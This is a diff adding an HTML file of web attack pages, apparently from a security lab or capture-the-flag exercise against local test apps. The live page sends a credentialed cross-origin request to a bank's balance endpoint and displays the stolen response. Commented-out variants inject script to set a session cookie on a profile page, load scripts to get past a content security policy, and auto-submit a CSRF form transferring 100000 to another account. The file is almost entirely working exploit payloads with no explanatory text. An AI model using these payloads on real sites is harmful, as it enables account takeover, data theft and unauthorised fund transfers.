@@ -1,0 +1,78 @@
+<!--original-->
+<html>
+<head>
+    <script>
+        var xhr = new XMLHttpRequest();
+        xhr.onerror = xhr.onload = function () {
+            document.body.innerHTML = "<p>" + xhr.responseText + "</p>";
+        }
+
+        xhr.open("GET", "http://bank.local:3000/viewbalance");
+        xhr.setRequestHeader('X-Custom-Header', '14828');
+        xhr.withCredentials = true;
+        xhr.send();
+    </script>
+</head>
+<body>
+</body>
+</html>
+
+<!--<html>
+
+<head>
+    <title>THE Facebook</title>
+
+</head>
+
+<body>
+<div class="container">
+    <img src='profile.png'/>
+    <h1>Hi 123q!</h1>
+    <h2>Your favorite animal is
+        <script>
+            window.onload=function(){
+                debugger;
+                docCookies.setItem("connect.sid", "12")
+            }
+        </script>.</h2>
+
+    <p>Having a problem with your profile? Click <a href="/contact">here</a> to inform the admin!</p>
+    <br>
+    <a href='/logout?cookie="123"'>Click here to logout</a>
+</div>
+</body>
+
+</html>-->
+
+
+<!--bad CSP-->
+<!--<html>
+<head>
+    <script src="js/interaction.js"/>
+    <script src="js/jquery.js"/>
+    <script src="js/app.js"/>
+</head>
+<body>
+</body>
+</html>-->
+
+<!--baby CSRF-->
+<!--
+<html>
+<head>
+    <script>
+        window.onload = function(){
+            document.forms['form1'].submit();
+        }
+    </script>
+
+</head>
+<body>
+<form action="http://192.168.2.83:5004/transfer" method="post" name="form1">
+    <input type="text" name="user_to" value="1@1.com">
+    <input type="text" name="amount" value="100000">
+    <input type="submit">
+</form>
+</body>
+</html>
+-->
